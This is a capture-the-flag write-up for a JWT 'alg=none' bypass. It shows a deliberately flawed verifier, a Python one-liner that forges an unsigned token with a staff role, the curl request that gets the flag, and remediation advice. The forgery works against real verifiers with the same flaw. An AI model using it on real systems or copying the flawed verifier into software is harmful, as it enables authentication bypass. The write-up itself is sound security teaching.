## 1. Overview

The challenge page issues a signed visitor pass as a JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidmlzaXRvciIsInJvbGUiOiJ2aXNpdG9yIn0.2JadwlhGF4Pkn80oZaqrI6Jtmvm-zu90jLEJw7rvS0E
```

It tells us to send this token as:

```
Authorization: Bearer TOKEN
```

to the `desk` endpoint.

The page also links to a verification routine at `verifier.txt`.

---

## 2. Recon

First, fetch the homepage:

```bash
curl -i -sS -L 'https://challenges.tibeb.org/2d909969-3065-48c8-b784-0ff5a2754d13/'
```

The response contains the visitor JWT and a link:

```html
<a href='verifier.txt'>Verification routine</a>
```

Next, fetch the verifier:

```bash
curl -i -sS -L 'https://challenges.tibeb.org/2d909969-3065-48c8-b784-0ff5a2754d13/verifier.txt'
```

Response body:

```python
header, payload, signature = decode_jwt_parts(token)
if header['alg'] == 'HS256':
    verify_hmac(token)
return payload  # all other algorithms skip verification
```

This is the key vulnerability.

---

## 3. Vulnerability — JWT `alg=none` Bypass

The verification logic only performs HMAC signature verification when the JWT header says:

```json
"alg": "HS256"
```

For **any other algorithm**, it skips verification entirely and simply returns the decoded payload.

This is a classic **JWT algorithm confusion / `alg=none` bypass**.

If we set the header algorithm to `"none"`, the server will trust the payload without checking the signature.

The original token has:

```json
{
  "user": "visitor",
  "role": "visitor"
}
```

The staff-only desk likely checks `role == "staff"`. So we need to forge a token with:

```json
{
  "user": "visitor",
  "role": "staff"
}
```

and header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The signature part must be empty, so the final token ends with a dot: `header.payload.`

---

## 4. Exploit

### Step 1 — Generate the forged JWT

Use Python to create a base64url-encoded JWT with `alg=none` and `role=staff`.

```bash
TOKEN=$(python3 -c '
import base64, json
h = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
).rstrip(b"=").decode()
p = base64.urlsafe_b64encode(
    json.dumps({"user": "visitor", "role": "staff"}, separators=(",", ":")).encode()
).rstrip(b"=").decode()
print(f"{h}.{p}.")
')
echo "$TOKEN"
```

This produces:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidmlzaXRvciIsInJvbGUiOiJzdGFmZiJ9.
```

### Step 2 — Send it to `/desk`

```bash
curl -i -sS -L -H "Authorization: Bearer $TOKEN" \
  'https://challenges.tibeb.org/2d909969-3065-48c8-b784-0ff5a2754d13/desk'
```

Response:

```
HTTP/2 200
content-type: text/plain
content-length: 39

tibeb{pass_office_cbdeb320770518703679}
```

---

## 5. Flag

```
tibeb{pass_office_cbdeb320770518703679}
```

---

## 6. Tricky Parts / Notes

- **The verifier is at `/verifier.txt`, not `/verifier`.** The homepage link points to `verifier.txt`.
- **Only `alg == "HS256"` is verified.** Any other algorithm — including `none` — bypasses signature checking.
- **The signature part must be empty.** The JWT format is `header.payload.signature`. For `alg=none`, you use a trailing dot: `header.payload.`
- **Base64url encoding must not include padding.** Python’s `base64.urlsafe_b64encode` adds `=` padding; strip it with `.rstrip(b"=")`.
- **The `role` must be exactly `staff`.** Trying `role=admin` returned `403 Staff only`. The desk checks for the `staff` role specifically.
- **The original visitor token is not enough.** It decodes to `role=visitor`, so the desk rejects it.

---

## 7. Remediation (for developers)

- Never trust the `alg` header from an untrusted token.
- Explicitly allow only the expected algorithm(s), e.g. `HS256`.
- Reject `alg=none` and any unexpected algorithms.
- Always verify the signature before trusting the payload.
- Use a well-maintained JWT library with safe defaults.
